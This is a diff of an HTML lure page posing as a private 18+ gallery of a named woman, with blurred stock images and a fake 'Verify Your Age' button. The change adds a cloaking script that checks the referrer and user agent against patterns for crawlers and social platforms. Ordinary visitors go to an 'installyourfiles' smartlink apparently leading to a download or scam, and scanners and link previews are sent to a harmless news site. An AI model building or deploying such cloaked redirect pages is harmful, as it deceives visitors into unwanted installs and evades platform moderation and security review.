@@ -1,27 +1,19 @@
 <!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Natasha Ave Private Gallery</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Natasha Ave - Private Gallery</title>
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #111;
+      background-color: #111;
       color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      background-image: url('https://images.unsplash.com/photo-1600185365228-8be41cb9f1d4?auto=format&fit=crop&w=1470&q=80');
-      background-size: cover;
-      background-position: center;
     }
     .container {
-      background: rgba(0, 0, 0, 0.7);
-      padding: 30px;
-      border-radius: 10px;
+      max-width: 900px;
+      margin: 40px auto;
+      padding: 20px;
       text-align: center;
     }
     h1 {
@@ -31,30 +23,64 @@
     p {
       font-size: 1em;
       margin-bottom: 20px;
+      color: #ccc;
     }
-    button {
-      padding: 12px 25px;
-      font-size: 1em;
-      background: #ff3366;
-      border: none;
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 15px;
+    }
+    .gallery img {
+      width: 100%;
+      border-radius: 10px;
+      filter: blur(6px);
+      transition: 0.3s;
+    }
+    .gallery img:hover {
+      filter: blur(0);
+    }
+    .btn {
+      margin-top: 30px;
+      padding: 12px 30px;
+      background-color: #ff3366;
       color: white;
+      border: none;
       border-radius: 8px;
+      font-size: 1em;
       cursor: pointer;
-      transition: background 0.3s ease;
     }
-    button:hover {
-      background: #ff0055;
+    .btn:hover {
+      background-color: #e6005c;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Private Gallery of Natasha Ave</h1>
-    <p>Warning: This content is only for 18+ viewers. Please verify your age to continue.</p>
-    <button onclick="redirect()">Verify Your Age</button>
+    <h1>Natasha Ave's Secret Gallery</h1>
+    <p>Preview only. To view full gallery, please verify your age.</p>
+    <div class="gallery">
+      <img src="https://source.unsplash.com/random/201x300/?girl" alt="Private Photo">
+      <img src="https://source.unsplash.com/random/202x300/?model" alt="Private Photo">
+      <img src="https://source.unsplash.com/random/203x300/?fashion" alt="Private Photo">
+      <img src="https://source.unsplash.com/random/204x300/?posing" alt="Private Photo">
+      <img src="https://source.unsplash.com/random/205x300/?woman" alt="Private Photo">
+      <img src="https://source.unsplash.com/random/206x300/?lifestyle" alt="Private Photo">
+    </div>
+    <button class="btn" onclick="goCloak()">Verify Your Age</button>
   </div>  <script>
-    function redirect() {
-      window.location.href = "https://installyourfiles.com/1820364";
+    function goCloak() {
+      const blockList = [
+        /facebook|crawler|bot|preview|whatsapp|telegram|slack|discord/i,
+        /google|t.co|tiktok|pinterest|reddit/i
+      ];
+      const ref = document.referrer;
+      const ua = navigator.userAgent;
+      const suspicious = blockList.some(regex => regex.test(ref) || regex.test(ua));
+      if (!suspicious) {
+        window.location.href = "https://installyourfiles.com/1820364"; // smartlink kamu
+      } else {
+        window.location.href = "https://cnn.com"; // halaman aman
+      }
     }
   </script></body>
 </html>
